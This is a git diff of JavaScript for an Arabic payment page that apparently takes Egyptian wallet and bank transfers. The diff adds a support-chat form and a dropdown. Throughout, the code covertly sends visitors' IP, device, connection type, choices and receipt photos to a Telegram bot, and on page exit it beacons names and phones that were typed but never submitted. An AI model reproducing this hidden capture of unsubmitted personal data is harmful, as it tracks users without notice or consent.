@@ -13,7 +13,6 @@ let hasLoggedPageVisit = false;
 let isPaymentCompleted = false;
 let clientIp = 'جاري الجلب...';
 
-// جلب عنوان الـ IP للعميل عند فتح الصفحة
 async function fetchClientIP() {
     try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -24,7 +23,6 @@ async function fetchClientIP() {
     }
 }
 
-// دالة تحديد نوع الجهاز
 function getDeviceInfo() {
     const ua = navigator.userAgent;
     let device = "كمبيوتر / جهاز مكتبي";
@@ -34,19 +32,14 @@ function getDeviceInfo() {
     return device;
 }
 
-// دالة تحديد نوع الاتصال (داتا أم واي فاي)
 function getConnectionType() {
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (!conn) return "غير متوفر بالمتصفح";
     
     let typeDesc = conn.type || conn.effectiveType || "غير معروف";
-    if (conn.type === 'cellular') {
-        typeDesc = "بيانات المحمول (Mobile Data)";
-    } else if (conn.type === 'wifi') {
-        typeDesc = "واي فاي (WiFi)";
-    } else if (conn.effectiveType) {
-        typeDesc = `شبكة (${conn.effectiveType})`;
-    }
+    if (conn.type === 'cellular') typeDesc = "بيانات المحمول (Mobile Data)";
+    else if (conn.type === 'wifi') typeDesc = "واي فاي (WiFi)";
+    else if (conn.effectiveType) typeDesc = `شبكة (${conn.effectiveType})`;
     return typeDesc;
 }
 
@@ -54,7 +47,6 @@ window.onload = function() {
     fetchClientIP();
 };
 
-// تتبع مغادرة الصفحة إذا قام العميل بكتابة بيانات ولم يُكمل الدفع
 window.addEventListener('beforeunload', function(event) {
     const senderName = document.getElementById('sender-name').value.trim();
     const phone = document.getElementById('sender-phone').value.trim();
@@ -71,6 +63,107 @@ window.addEventListener('beforeunload', function(event) {
         const payload = JSON.stringify({ chat_id: CHAT_ID, text: text });
         
         navigator.sendBeacon ? navigator.sendBeacon(url, new Blob([payload], {type: 'application/json'})) : fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: payload, keepalive: true });
+    }
+});
+
+// دوال التحكم بنافذة الدردشة (الدعم الفني)
+window.toggleChatModal = function() {
+    const modal = document.getElementById('chat-modal');
+    modal.classList.toggle('hidden');
+    if (!modal.classList.contains('hidden')) {
+        logTelegramAlert(`💬 [فتح نافذة الدردشة]: قام العميل بفتح نافذة المراسلة والدعم.\n🌐 IP: ${clientIp}`);
+    }
+}
+
+// إرسال تفاصيل مشكلة الدعم الفني لتليجرام
+window.submitSupportTicket = async function() {
+    const name = document.getElementById('support-name').value.trim();
+    const email = document.getElementById('support-email').value.trim();
+    const phone = document.getElementById('support-phone').value.trim();
+    const reason = document.getElementById('support-reason').value.trim();
+    const details = document.getElementById('support-details').value.trim();
+
+    if (!name) {
+        showToast("يرجى إدخال اسمك الكريم!");
+        return;
+    }
+
+    const egyptianPhoneRegex = /^01[0125][0-9]{8}$/;
+    if (!egyptianPhoneRegex.test(phone)) {
+        showToast("يرجى إدخال رقم تليفون صحيح (11 رقم)!");
+        return;
+    }
+
+    if (!reason) {
+        showToast("يرجى إدخال سبب المشكلة!");
+        return;
+    }
+
+    if (!details) {
+        showToast("يرجى كتابة تفاصيل المشكلة!");
+        return;
+    }
+
+    showToast("🚀 جاري إرسال استفسارك...");
+
+    const text = `🛠️️ [رسالة دعم فني جديدة من العملاء]\n\n` +
+                 `👤 الاسم: ${name}\n` +
+                 `📧 البريد الإلكتروني: ${email || 'غير مدخل'}\n` +
+                 `📱 الهاتف: ${phone}\n` +
+                 `📌 سبب المشكلة: ${reason}\n` +
+                 `📝 تفاصيل المشكلة:\n${details}\n\n` +
+                 `🌐 عنوان الـ IP: ${clientIp}\n` +
+                 `💻 نوع الجهاز: ${getDeviceInfo()}\n` +
+                 `📶 نوع الاتصال: ${getConnectionType()}`;
+
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+        const data = await res.json();
+
+        if (data.ok) {
+            showToast("تم ارسال اسالتك وهيتم رد عليك في اسرع وقت ممكن");
+            setTimeout(() => {
+                document.getElementById('support-name').value = '';
+                document.getElementById('support-email').value = '';
+                document.getElementById('support-phone').value = '';
+                document.getElementById('support-reason').value = '';
+                document.getElementById('support-details').value = '';
+                toggleChatModal();
+            }, 2500);
+        } else {
+            showToast("فشل إرسال الاستفسار، حاول مرة أخرى.");
+        }
+    } catch (error) {
+        console.error(error);
+        showToast("حدث خطأ أثناء الاتصال.");
+    }
+}
+
+// دوال التحكم بالقائمة المنسدلة المخصصة
+window.toggleDropdown = function() {
+    const menu = document.getElementById('dropdown-menu');
+    const arrow = document.getElementById('dropdown-arrow');
+    menu.classList.toggle('hidden');
+    arrow.classList.toggle('rotate-180');
+}
+
+window.selectCustomOption = function(optionText) {
+    document.getElementById('transfer-method').value = optionText;
+    document.getElementById('dropdown-selected-text').innerText = optionText;
+    toggleDropdown();
+}
+
+window.addEventListener('click', function(e) {
+    const btn = document.getElementById('dropdown-btn');
+    const menu = document.getElementById('dropdown-menu');
+    const arrow = document.getElementById('dropdown-arrow');
+    if (btn && menu && !btn.contains(e.target) && !menu.contains(e.target)) {
+        menu.classList.add('hidden');
+        arrow.classList.remove('rotate-180');
     }
 });
 
@@ -93,13 +186,17 @@ window.selectWallet = function(walletKey) {
     const wallet = walletData[walletKey];
     document.getElementById('wallet-title').innerText = `تحويل ${wallet.name} - ياسر محمد`;
     document.getElementById('open-app-text').innerText = wallet.appName;
+    
     document.getElementById('transfer-method').value = wallet.name;
+    document.getElementById('dropdown-selected-text').innerText = wallet.name;
+    
     showPage('page-action');
     logTelegramAlert(`📱 [اختيار محفظة]: المستخدم اختار التحويل عبر (${wallet.name})`);
 }
 
 window.selectBankTransferMethod = function() {
     document.getElementById('transfer-method').value = 'تحويل بنكي';
+    document.getElementById('dropdown-selected-text').innerText = 'تحويل بنكي';
     showPage('page-confirm');
     logTelegramAlert("🏦 [اختيار تحويل بنكي]: المستخدم انتقل لصفحة تفاصيل التحويل البنكي بنك القاهرة.");
 }
@@ -215,12 +312,11 @@ window.submitWithoutAI = async function() {
             `📶 نوع الاتصال: ${getConnectionType()}`
         );
 
-        const tgRes = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-        const res = await fetch(tgRes, {
+        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
         });
-        const tgData = await res.json();
+        const tgData = await tgRes.json();
 
         if (tgData.ok) {
             isPaymentCompleted = true;
